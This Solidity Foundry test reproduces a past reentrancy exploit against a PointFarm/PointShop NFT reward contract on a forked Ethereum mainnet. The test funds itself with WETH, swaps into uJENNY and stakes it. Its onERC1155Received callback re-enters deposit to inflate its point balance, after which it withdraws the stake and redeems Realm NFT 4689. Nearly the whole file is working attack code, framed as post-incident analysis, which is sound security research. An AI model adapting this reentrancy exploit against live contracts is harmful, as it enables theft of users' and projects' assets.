// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : 1 NFT (ID: 4689)
// Attacker : https://etherscan.io/address/0x92cfcb70b2591ceb1e3c6d90e21e8154e7d29832
// Attacker Contract : https://etherscan.io/address/0x9d9820f10772ffcef842770b6581c07a97fed9e4
// Vulnerable Contract : https://etherscan.io/address/0xd3c41c85be295607e8ea5c58487ec5894300ee67
// Attack Tx : https://etherscan.io/tx/0xc42fe1ce2516e125a386d198703b2422aa0190b25ef6a7b0a1d3c6f5d199ffad

// @Analysis
// https://twitter.com/DecurityHQ/status/1703096116047421863

interface IPointFarm {
    function balanceOf(address account, uint256 id) external view returns (uint256);

    function setApprovalForAll(address operator, bool _approved) external;

    function deposit(uint256 _pid, uint256 _amount) external;

    function withdraw(uint256 _pid, uint256 _amount) external;
}

interface IPointShop {
    function redeem(address _uToken, uint256 internalID) external;
}

contract ContractTest is Test {
    IERC20 private constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 private constant uJENNY = IERC20(0xa499648fD0e80FD911972BbEb069e4c20e68bF22);
    Uni_Pair_V2 private constant uJENNY_WETH = Uni_Pair_V2(0xEC5100AD159F660986E47AFa0CDa1081101b471d);
    IPointFarm private constant PointFarm = IPointFarm(0xd3C41c85bE295607E8EA5c58487eC5894300ee67);
    IPointShop private constant PointShop = IPointShop(0xcDCc535503CBA9286489b338b36156b4b75008f6);
    IERC721 private constant Realm = IERC721(0x7AFe30cB3E53dba6801aa0EA647A0EcEA7cBe18d);

    function setUp() public {
        vm.createSelectFork("mainnet", 18_133_171);
        vm.label(address(WETH), "WETH");
        vm.label(address(uJENNY), "uJENNY");
        vm.label(address(uJENNY_WETH), "uJENNY_WETH");
        vm.label(address(PointFarm), "PointFarm");
        vm.label(address(PointShop), "PointShop");
        vm.label(address(Realm), "Realm");
    }

    function testExploit() public {
        // Start with the below amount of WETH
        deal(address(WETH), address(this), 500e15);
        // Preparation phase
        uJENNY.approve(address(PointFarm), type(uint256).max);
        WETHToUJENNY();
        uint256 amtuJENNY = uJENNY.balanceOf(address(this));
        PointFarm.deposit(0, uJENNY.balanceOf(address(this)));
        // Wait ~2 days
        vm.roll(18_149_401);
        // Attack
        emit log_named_uint("Attacker Realm NFT balance before attack", Realm.balanceOf(address(this)));
        // Reentrancy here. Inflate the attacker balance of PointFarm to redeem Realm NFT later from PointShop
        PointFarm.deposit(0, 0);
        // Getting initial deposit (preparation phase) back
        PointFarm.withdraw(0, amtuJENNY);
        UJENNYToWETH(amtuJENNY);

        // Getting NFT from PointShop
        PointFarm.setApprovalForAll(address(PointShop), true);
        PointShop.redeem(address(uJENNY), 0);

        emit log_named_decimal_uint(
            "Attacker WETH balance after attack", WETH.balanceOf(address(this)), WETH.decimals()
        );
        // 4689 - id of the stolen NFT
        assertEq(Realm.ownerOf(4689), address(this));
        emit log_named_uint("Attacker Realm NFT balance after attack", Realm.balanceOf(address(this)));
    }

    function WETHToUJENNY() internal {
        (uint112 reserveuJENNY, uint112 reserveWETH,) = uJENNY_WETH.getReserves();
        uint256 amountOut = calcAmountOut(reserveuJENNY, reserveWETH, WETH.balanceOf(address(this)));
        WETH.transfer(address(uJENNY_WETH), WETH.balanceOf(address(this)));
        uJENNY_WETH.swap(amountOut, 0, address(this), bytes(""));
    }

    function UJENNYToWETH(uint256 amount) internal {
        (uint112 reserveuJENNY, uint112 reserveWETH,) = uJENNY_WETH.getReserves();
        uint256 amountOut = calcAmountOut(reserveWETH, reserveuJENNY, amount);
        uJENNY.transfer(address(uJENNY_WETH), amount);
        uJENNY_WETH.swap(0, amountOut, address(this), bytes(""));
    }

    function calcAmountOut(uint256 reserve1, uint256 reserve2, uint256 tokenAmount) internal pure returns (uint256) {
        uint256 a = tokenAmount * 997;
        uint256 b = a * reserve1;
        uint256 c = reserve2 * 1000;
        return b / (a + c);
    }

    function onERC1155Received(
        address operator,
        address from,
        uint256 id,
        uint256 value,
        bytes calldata data
    ) external returns (bytes4) {
        uint256 pointFarmBalance = PointFarm.balanceOf(address(this), 0);
        if (pointFarmBalance <= 10_000) {
            PointFarm.deposit(0, 0);
        }
        return this.onERC1155Received.selector;
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        return this.onERC721Received.selector;
    }

    receive() external payable {}
}
